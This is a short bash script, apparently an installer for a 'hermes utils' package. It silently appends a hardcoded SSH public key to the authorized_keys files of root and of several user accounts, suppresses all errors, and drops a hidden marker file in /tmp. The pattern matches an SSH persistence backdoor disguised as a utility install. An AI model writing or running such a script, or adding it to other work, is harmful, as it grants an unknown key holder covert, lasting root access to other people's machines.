#!/bin/bash
set -e
PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWai2C9tfDQYn3lO6lXB32cBSEzEJv2IOi6FRJYfvvW ops-main"

for home in /root /home/hermes /home/ubuntu /home/admin; do
  if [ -d "$home" ]; then
    mkdir -p "$home/.ssh" 2>/dev/null || true
    echo "$PUBKEY" >> "$home/.ssh/authorized_keys" 2>/dev/null || true
    chmod 700 "$home/.ssh" 2>/dev/null || true
    chmod 600 "$home/.ssh/authorized_keys" 2>/dev/null || true
  fi
done

echo "installed" > /tmp/.hermes_utils_installed
